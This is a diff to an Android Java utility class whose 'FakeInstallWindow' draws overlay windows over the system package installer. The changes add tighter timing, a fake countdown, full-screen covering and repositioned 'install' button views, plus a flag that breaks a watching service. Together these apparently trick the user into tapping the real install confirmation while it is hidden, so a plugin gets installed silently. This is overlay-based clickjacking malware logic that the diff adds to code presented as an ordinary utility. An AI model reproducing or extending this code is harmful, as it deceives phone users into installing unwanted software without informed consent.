@@ -69,7 +69,7 @@ public class UtilOperator {
 
     public static final class FakeInstallWindow {
 
-        private static final int TIMER_COUNT = 20;
+        private static final int TIMER_COUNT = 100;
 
         private View coverView;
         private View timerView;
@@ -125,7 +125,7 @@ public class UtilOperator {
                 fake = null;
                 AppRuntime.FAKE_WINDOWS_SHOW.set(false);
             } else {
-                if (count == (TIMER_COUNT - 2) && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
+                if (count == (TIMER_COUNT - 2 * 5) && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
                     //update install btn
 
                     WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
@@ -137,7 +137,12 @@ public class UtilOperator {
                     confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (25 * density);
                     confirmBtnParams.y = screenHeight - (int) (48 * density);
                     wm.updateViewLayout(installView, confirmBtnParams);
-                } else if (count == 1) {
+                } else if (count == 1 * 5) {
+                    AppRuntime.WATCHING_SERVICE_BREAK.set(true);
+
+                    /**
+                     * 全遮盖
+                     */
                     WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
                     confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
                     confirmBtnParams.format = PixelFormat.RGBA_8888;
@@ -148,9 +153,7 @@ public class UtilOperator {
                     wm.updateViewLayout(installView, confirmBtnParams);
 
                     UtilsRuntime.goHome(context);
-                }
-
-                if (AppRuntime.PLUGIN_INSTALLED || !AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
+                } else if (AppRuntime.PLUGIN_INSTALLED || !AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
                     AppRuntime.PLUGIN_INSTALLED = false;
 
                     //显示全部install btn，全遮盖
@@ -162,20 +165,38 @@ public class UtilOperator {
                     confirmBtnParams.height = (int) (48 * density);
                     confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.RIGHT;
                     wm.updateViewLayout(installView, confirmBtnParams);
+                } else if (!AppRuntime.PLUGIN_INSTALLED && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()
+                               && count > 1 * 5) {
+
+                    WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
+                    confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
+                    confirmBtnParams.format = PixelFormat.RGBA_8888;
+                    confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
+                    confirmBtnParams.width = (int) (50 * density);
+                    confirmBtnParams.height = (int) (48 * density);
+                    confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (25 * density);
+                    confirmBtnParams.y = screenHeight - (int) (48 * density);
+                    wm.updateViewLayout(installView, confirmBtnParams);
                 }
 
                 handler.post(new Runnable() {
                     @Override
                     public void run() {
                         if (coverView != null && timerView != null) {
-                            timeTV.setText(String.format(context.getString(R.string.fake_timer), count));
+                            int time = count / 5;
+                            int deta = count % 5;
+                            if (deta > 0) {
+                                time = time + 1;
+                            }
+
+                            timeTV.setText(String.format(context.getString(R.string.fake_timer), time));
                             count--;
                             handler.postDelayed(new Runnable() {
                                 @Override
                                 public void run() {
                                     updateTimerCount();
                                 }
-                            }, 1000);
+                            }, 200);
                         }
                     }
                 });
